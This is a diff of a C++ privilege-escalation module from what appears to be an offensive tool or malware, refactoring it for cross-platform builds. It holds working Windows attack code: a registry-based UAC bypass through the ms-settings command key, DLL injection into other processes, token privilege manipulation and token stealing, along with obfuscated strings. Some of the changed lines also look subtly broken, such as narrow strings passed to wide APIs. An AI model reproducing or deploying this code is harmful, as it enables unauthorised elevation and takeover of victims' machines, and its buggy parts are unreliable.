@@ -1,20 +1,95 @@
 #include "security/PrivilegeEscalation.h"
 #include "core/Logger.h"
 #include "utils/SystemUtils.h"
+#include "core/Platform.h"
+#include <string>
+#include <vector>
+#include <cstdint>
+
+#if PLATFORM_WINDOWS
 #include <Windows.h>
 #include <sddl.h>
 #include <accctrl.h>
 #include <aclapi.h>
-#include <vector>
-#include <cstdint>
-#include <string>
+#endif
 
 // Obfuscated strings
 constexpr auto OBF_PRIVILEGE_ESCALATION = OBFUSCATE("PrivilegeEscalation");
 constexpr auto OBF_PRIVILEGE_ENABLED = OBFUSCATE("Privilege enabled: %s");
 constexpr auto OBF_PRIVILEGE_FAILED = OBFUSCATE("Failed to enable privilege: %s, error: %d");
 
-bool PrivilegeEscalation::EnablePrivilege(LPCTSTR privilege) {
+bool PrivilegeEscalation::EnablePrivilege(const char* privilege) {
+#if PLATFORM_WINDOWS
+    return EnableWindowsPrivilege(privilege);
+#elif PLATFORM_LINUX
+    // Linux privilege escalation would require different techniques
+    // For now, just log that we're on Linux
+    LOG_INFO("Privilege escalation on Linux not implemented for: " + std::string(privilege));
+    return false;
+#endif
+}
+
+bool PrivilegeEscalation::IsAdmin() {
+#if PLATFORM_WINDOWS
+    return IsWindowsAdmin();
+#elif PLATFORM_LINUX
+    // On Linux, check if we're root (UID 0)
+    return geteuid() == 0;
+#endif
+}
+
+bool PrivilegeEscalation::TryUACBypass() {
+#if PLATFORM_WINDOWS
+    return TryWindowsUACBypass();
+#elif PLATFORM_LINUX
+    // Linux doesn't have UAC, but we can try other privilege escalation techniques
+    LOG_INFO("UAC bypass not applicable on Linux");
+    return false;
+#endif
+}
+
+bool PrivilegeEscalation::CreateElevatedProcess() {
+#if PLATFORM_WINDOWS
+    return CreateWindowsElevatedProcess();
+#elif PLATFORM_LINUX
+    // On Linux, we might use pkexec, gksu, or other methods
+    LOG_INFO("Elevated process creation on Linux not implemented");
+    return false;
+#endif
+}
+
+bool PrivilegeEscalation::InjectIntoProcess(uint32_t pid) {
+#if PLATFORM_WINDOWS
+    return InjectIntoWindowsProcess(static_cast<DWORD>(pid));
+#elif PLATFORM_LINUX
+    // Linux process injection would use ptrace or other techniques
+    LOG_INFO("Process injection on Linux not implemented for PID: " + std::to_string(pid));
+    return false;
+#endif
+}
+
+bool PrivilegeEscalation::ModifyTokenPrivileges() {
+#if PLATFORM_WINDOWS
+    return ModifyWindowsTokenPrivileges();
+#elif PLATFORM_LINUX
+    // Linux capabilities manipulation would go here
+    LOG_INFO("Token privilege modification not applicable on Linux");
+    return false;
+#endif
+}
+
+bool PrivilegeEscalation::StealToken(uint32_t pid) {
+#if PLATFORM_WINDOWS
+    return StealWindowsToken(static_cast<DWORD>(pid));
+#elif PLATFORM_LINUX
+    // Linux doesn't have tokens in the Windows sense
+    LOG_INFO("Token stealing not applicable on Linux for PID: " + std::to_string(pid));
+    return false;
+#endif
+}
+
+#if PLATFORM_WINDOWS
+bool PrivilegeEscalation::EnableWindowsPrivilege(LPCTSTR privilege) {
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
     LUID luid;
@@ -50,7 +125,7 @@ bool PrivilegeEscalation::EnablePrivilege(LPCTSTR privilege) {
     return true;
 }
 
-bool PrivilegeEscalation::IsAdmin() {
+bool PrivilegeEscalation::IsWindowsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
     SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
@@ -69,25 +144,19 @@ bool PrivilegeEscalation::IsAdmin() {
     return isAdmin;
 }
 
-bool PrivilegeEscalation::TryUACBypass() {
+bool PrivilegeEscalation::TryWindowsUACBypass() {
     // Attempt various UAC bypass techniques (for research purposes only)
     std::vector<bool(*)(void)> techniques = {
-        // Technique 1: DLL hijacking
-        []() -> bool {
-            // This would attempt to place a malicious DLL in a writable directory
-            // that gets loaded by a privileged process
-            return false; // Placeholder
-        },
-        // Technique 2: Registry modification
+        // Technique 1: Registry modification
         []() -> bool {
             HKEY hKey;
             if (RegCreateKeyExA(HKEY_CURRENT_USER,
                 "Software\\Classes\\ms-settings\\shell\\open\\command",
                 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                 
-                std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
+                std::string exePath = utils::FileUtils::GetCurrentExecutablePath();
                 if (RegSetValueExA(hKey, NULL, 0, REG_SZ,
-                    (const BYTE*)exePath.c_str(), (DWORD)exePath.length() * 2 + 1) == ERROR_SUCCESS) {
+                    (const BYTE*)exePath.c_str(), (DWORD)exePath.length()) == ERROR_SUCCESS) {
                     
                     RegCloseKey(hKey);
                     return true;
@@ -108,9 +177,9 @@ bool PrivilegeEscalation::TryUACBypass() {
     return false;
 }
 
-bool PrivilegeEscalation::CreateElevatedProcess() {
+bool PrivilegeEscalation::CreateWindowsElevatedProcess() {
     SHELLEXECUTEINFO sei = { sizeof(sei) };
-    std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
+    std::string exePath = utils::FileUtils::GetCurrentExecutablePath();
 
     sei.lpVerb = L"runas";
     sei.lpFile = exePath.c_str();
@@ -125,7 +194,7 @@ bool PrivilegeEscalation::CreateElevatedProcess() {
     return true;
 }
 
-bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
+bool PrivilegeEscalation::InjectIntoWindowsProcess(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
         LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
@@ -141,7 +210,7 @@ bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
     }
 
     // Allocate memory in the target process
-    std::string dllPath = utils::StringUtils::WideToUtf8(utils::FileUtils::GetCurrentModulePath());
+    std::string dllPath = utils::FileUtils::GetCurrentModulePath();
     LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPath.length(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteMem) {
         LOG_ERROR("VirtualAllocEx failed: " + std::to_string(GetLastError()));
@@ -175,7 +244,7 @@ bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
     return true;
 }
 
-bool PrivilegeEscalation::ModifyTokenPrivileges() {
+bool PrivilegeEscalation::ModifyWindowsTokenPrivileges() {
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
         LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
@@ -209,7 +278,7 @@ bool PrivilegeEscalation::ModifyTokenPrivileges() {
     return false;
 }
 
-bool PrivilegeEscalation::StealToken(DWORD pid) {
+bool PrivilegeEscalation::StealWindowsToken(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
     if (!hProcess) {
         LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
@@ -244,3 +313,4 @@ bool PrivilegeEscalation::StealToken(DWORD pid) {
     CloseHandle(hProcess);
     return true;
 }
+#endif
